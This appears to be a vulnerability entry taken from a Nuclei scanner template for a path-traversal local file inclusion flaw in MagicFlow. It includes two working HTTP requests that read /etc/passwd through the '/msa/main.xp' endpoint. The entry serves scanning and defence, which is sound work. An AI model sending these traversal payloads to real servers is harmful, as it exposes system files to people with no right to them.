# Nuclei Template: MagicFlow - Local File Inclusion
**Template ID:** magicflow-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`magicflow-lfi.yaml`)

## Vulnerability Information & PoC

## Description
MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd
GET {{BaseURL}}/msa/../../../../../../../../etc/passwd
```

## References
- https://www.seebug.org/vuldb/ssvid-89258
